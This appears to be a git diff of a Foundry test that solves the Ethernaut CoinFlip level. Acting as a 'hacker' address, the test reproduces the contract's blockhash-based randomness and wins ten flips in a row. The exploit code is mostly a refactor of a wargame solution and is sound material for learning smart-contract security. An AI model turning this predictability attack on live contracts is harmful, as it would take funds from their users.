@@ -10,6 +10,9 @@ contract CoinFlipTest is Test {
 
     address instance = vm.addr(0x1); 
     address hacker = vm.addr(0x2); 
+    
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    uint8 consecutiveWinsHacked = 10;
 
     function setUp() public {
 
@@ -18,32 +21,39 @@ contract CoinFlipTest is Test {
     
     }
 
+    /////////////////////////////////////////////////////
+    // Copy the pseudo-random function from the contract
+    ////////////////////////////////////////////////////
+    function generateSide() internal view returns (bool) {
+
+            uint256 blockValue = uint256(blockhash(block.number - 1));
+            uint256 coinFlip = blockValue / FACTOR;
+            bool side = coinFlip == 1 ? true : false;
+            return side;
+
+     }
+
     function testCoinFlipHack() public {
 
         vm.startPrank(hacker);
         assertEq(level.consecutiveWins(), 0);
-
-        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-        uint8 consecutiveWinsHacked = 10;
-
+    
         while (level.consecutiveWins() < consecutiveWinsHacked) {
 
-            /////////////////////////////////////////////////////
-            // Copy the pseudo-random function from the contract
-            ////////////////////////////////////////////////////
-            uint256 blockValue = uint256(blockhash(block.number - 1));
-            uint256 coinFlip = blockValue / FACTOR;
-            level.flip(coinFlip == 1 ? true : false);
+            /////////////////////
+            // "Flip" the coin
+            ////////////////////
+            level.flip(generateSide());
 
-            ///////////////////////////////////////
-            // Run a simulate for the transaction
-            ///////////////////////////////////////
-            uint256 targetBlock = block.number + 1;
-            vm.roll(targetBlock);
+            ////////////////////////////
+            // Simulate the next block
+            ////////////////////////////
+            vm.roll(block.number + 1);
 
         }
 
         assertEq(level.consecutiveWins(), consecutiveWinsHacked);
         vm.stopPrank();
+
       }
 }
